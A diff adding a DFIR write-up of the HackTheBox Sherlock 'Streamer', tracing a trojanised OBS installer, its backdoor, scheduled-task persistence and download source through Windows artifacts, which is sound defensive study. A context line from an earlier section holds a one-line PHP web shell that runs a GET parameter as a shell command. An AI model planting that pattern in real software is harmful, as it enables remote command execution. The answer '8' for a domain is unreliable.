@@ -1400,3 +1400,127 @@ We know that the extension dropped something like `.php`, attackers always tend 
 ``` php
 $testc = $_GET['s1']; echo `$testc`;
 ```
+
+### XVII. Streamer:
+> - Link lab: https://app.hackthebox.com/sherlocks/Streamer?tab=play_sherlock
+> - Đề bài:
+> ![image](https://hackmd.io/_uploads/BkEZf0ssMe.png)
+
+#### 1. What's the original name of the malicious zip file which the user downloaded thinking it was a legit copy of the software?
+I tried to analyse `History` by using DB Sqlite to look for some information related to file-downloading, but I cannot find anything. When check `Desktop` of `Public` user:
+![image](https://hackmd.io/_uploads/BkkGbGTszx.png)
+There is a software whose name is OBS, and is often used to record the computer screen. So I used `LECmd.exe` to analyse this `.lnk` file:
+![image](https://hackmd.io/_uploads/BJCF-zajze.png)
+It belongs to our dev, so I will do something with `$MFT` and `$J`:
+![image](https://hackmd.io/_uploads/BkYcy7ToGe.png)
+![image](https://hackmd.io/_uploads/rJRFlQTjzx.png)
+And in `NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\` of `Simon.stark`:
+![image](https://hackmd.io/_uploads/r1zowGaize.png)
+There also have a renamed folder under `OBS-Studio-28.1.2-Full-Installer-x64.exe`.
+
+**Answer:** `OBS-Studio-28.1.2-Full-Installer-x64.zip`
+
+#### 2. Simon Stark renamed the downloaded zip file to something else. What's the renamed Name of the file alongside the full path?
+According to the above task:
+![image](https://hackmd.io/_uploads/ryhpJQTofl.png)
+
+**Answer:** `C:\Users\Simon.stark\Documents\Streaming Software\Obs Streaming Software.zip`
+
+#### 3. What's the timestamp when the file was renamed?
+In `$J`:
+![image](https://hackmd.io/_uploads/r1Ay-XToGg.png)
+
+**Answer:** `2023-05-05 10:22:23`
+
+#### 4. What's the Full URL from where the software was downloaded?
+Finding `Zone Id Contents` column of `Zone.Identifier`:
+![image](https://hackmd.io/_uploads/BkD0QXTjMg.png)
+![image](https://hackmd.io/_uploads/SJ357maife.png)
+
+**Answer:** `http://obsproicet.net/download/v28_23/OBS-Studio-28.1.2-Full-Installer-x64.zip`
+
+#### 5. Dig down deeper and find the IP Address on which the malicious domain was being hosted.
+Check for `Archive-Microsoft-Windows-DNS-Client%4Operational-2023-05-05-10-31-18-874.evtx` and find the event whose domain is `obsproicet.net`:
+![image](https://hackmd.io/_uploads/B1huFXpjfg.png)
+
+**Answer:** `13.232.96.186`
+
+#### 6. Multiple Source ports connected to communicate and download the malicious file from the malicious website. Answer the highest source port number from which the machine connected to the malicious website.
+Check `C\Windows\System32\LogFiles\Firewall\pfirewall.log` and look for `13.232.96.186`:
+![image](https://hackmd.io/_uploads/rJBLs7ajzl.png)
+![image](https://hackmd.io/_uploads/BJmwsXToMe.png)
+![image](https://hackmd.io/_uploads/HJqjo7Tize.png)
+The highest port is `50045`.
+
+**Answer:** `50045`
+
+#### 7. The zip file had a malicious setup file in it which would install a piece of malware and a legit instance of OBS studio software so the user has no idea they got compromised. Find the hash of the setup file.
+Beside `Desktop` and `Documents`, there is a folder containing the streaming software:
+![image](https://hackmd.io/_uploads/B1X71N6izx.png)
+`StrLocalGate` is the installer folder. Look at `Amcache_UnassociatedFileEntries` in `Amcache.hve`:
+![image](https://hackmd.io/_uploads/BynK9wCjMx.png)
+![image](https://hackmd.io/_uploads/rk9w5D0szg.png)
+The first one is more suspicious than the second.
+
+**Answer:** `35e3582a9ed14f8a4bb81fd6aca3f0009c78a3a1`
+
+#### 8. The malicious software automatically installed a backdoor on the victim's workstation. What's the name and filepath of the backdoor?
+There is a `.exe` whose filename is so weird, and its timestamp is quite close to the timestamp of malicious file.
+![image](https://hackmd.io/_uploads/HkeUXOCiGl.png)
+![image](https://hackmd.io/_uploads/HkTd7ORoMe.png)
+
+**Answer:** `C:\Users\Simon.stark\Miloyeki ker konoyogi\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe`
+
+#### 9. Find the prefetch hash of the backdoor.
+In `C:\Windows\Prefetch\`:
+![image](https://hackmd.io/_uploads/Hyh-NdRoGg.png)
+![image](https://hackmd.io/_uploads/H1pMSOCifx.png)
+
+**Answer:** `D8A6D943`
+
+#### 10. The backdoor is also used as a persistence mechanism in a stealthy manner to blend in the environment. What's the name used for persistence mechanism to make it look legit?
+Open the Terminal of challenge's `C:\Windows\System32\Tasks\`, then run the below command:
+``` bash
+find . -type f -exec sh -c 'strings -el "$1" | grep -q "lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe" && echo "$1"' _ {} \;
+```
+![image](https://hackmd.io/_uploads/BkUbtOCoGx.png)
+Bring up the content of `./COMSurrogate` by running `strings -el COMSurrogate`:
+![image](https://hackmd.io/_uploads/ryd8KdRjGg.png)
+It shows that the backdoor was ran with the highest privilege, whenever the user logs in.
+
+**Answer:** `COMSurrogate`
+
+#### 11. What's the bogus/invalid randomly named domain which the malware tried to reach?
+In `Archive-Microsoft-Windows-DNS-Client%4Operational-2023-05-05-10-31-18-874.evtx`, look for events whose timestamp close to the time that backdoor was created:
+![image](https://hackmd.io/_uploads/rJ2ppdRozl.png)
+
+**Answer:** `8`
+
+#### 12. The malware tried exfiltrating the data to a s3 bucket. What's the url of s3 bucket?
+When searching for `s3 bucket` on the Google, I found that it relates to Amazon:
+![image](https://hackmd.io/_uploads/BJaoGFRjzl.png)
+Then, I found this domain:
+![image](https://hackmd.io/_uploads/rkZlQKAozx.png)
+
+**Answer:** `bbuseruploads.s3.amazonaws.com`
+
+#### 13. What topic was simon going to stream about in week 1? Find a note or something similar and recover its content to answer the question.
+I saw a `.txt` file in his `Documents`:
+![image](https://hackmd.io/_uploads/ry7fVFCszl.png)
+Because it is a resident file (`Resident: True`) so perhaps we can read its content.
+![image](https://hackmd.io/_uploads/H1afBYAofg.png)
+The topic is `Filesystem Security`.
+
+**Answer:** `Filesystem Security`
+
+#### 14. What's the name of Security Analyst who triaged the infected workstation?
+ShellBag (in `NTUSER.DAT` and `UsrClass.dat`) record the information of how user accessed to files or folders,... I saw this in `Simon.stark_NTUSER.csv`:
+![image](https://hackmd.io/_uploads/HyBhWDyhfe.png)
+
+**Answer:** `CyberJunkie`
+
+#### 15. What's the network path from where acquisition tools were run?
+According to the above answer:
+![image](https://hackmd.io/_uploads/B1HMGD12fe.png)
+
+**Answer:** `DESKTOP-887GK2L\DESKTOP-887GK2L\Users\CyberJunkie\Desktop\Forela-Triage-Workstation\Acquisiton and Triage tools`
